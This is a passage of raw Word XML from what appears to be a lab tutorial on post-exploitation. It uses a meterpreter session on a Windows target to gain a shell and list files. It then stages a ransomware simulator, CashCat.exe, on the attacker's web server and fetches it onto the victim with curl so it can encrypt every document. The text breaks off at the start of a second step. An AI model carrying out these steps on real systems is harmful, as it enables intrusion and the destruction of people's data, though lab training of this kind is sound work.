    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000064">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50"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000066">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: sessions -i [number of session for ex 1,2,3….9]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000067">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000068">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2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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see that the meterpreter session has been established…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can type : sysinfo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006C">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1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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We i can see the name of my “OPERATING SYSTEM”,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">“USER NAME”, “VERSION” ,”WORKGROUP” etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000070">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To enter the system we need to type “shell”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000071">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77"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now have the “TERMINAL CONTROL” for our windows machine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000073">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000074">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can type “dir”  to see all the documents saved in our target machine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000075">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000076">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white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="4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white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="78"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white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="33"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white"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="60"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">These are list of information in my windows system saved.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000078">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000079">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can have access to all our system documents so now we can “ENCRYPT” all the documents in the victim machine by using “cashcat.exe” which is a ransomware simulation being run in the target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can download the CashCat.zip from the github website and once it is downloaded in our kali linux download file we need to extract the zip to get CashCat.exe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007C">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55"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to upload this is the VICTIM machine by typing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">cp  /home/swakshar/Downloads/CashCat.exe /var/www/html/share/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000080">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000081">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Once it is done we need to type in the meterpreter window</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000082">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Curl -O 10.10.1.3/CashCat.exe </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000083">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000084">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1"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now if we just type “CashCat.exe” ALL THE EXISTING FILES WILL BE ENCRYPTED EASILY AND THE NO DOCUMENTS WILL BE ACCESSES IN THE VICTIM MACHINE.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000086">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000087">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To decrypt we need to type the password “123456789”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000088">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000089">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can access files in the victim machine as well</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008B">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93" name="image96.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image96.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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see that we are inside C:/Users/chatt/Downloads already and we need to see the file named YOUTUBE_INTELLIPAAT.png</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">For that we just need to type:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">“YOUTUBE_INTELLIPAAT.png”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000090">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000091">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">STEP2:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000092">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000093">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000094">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000095">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
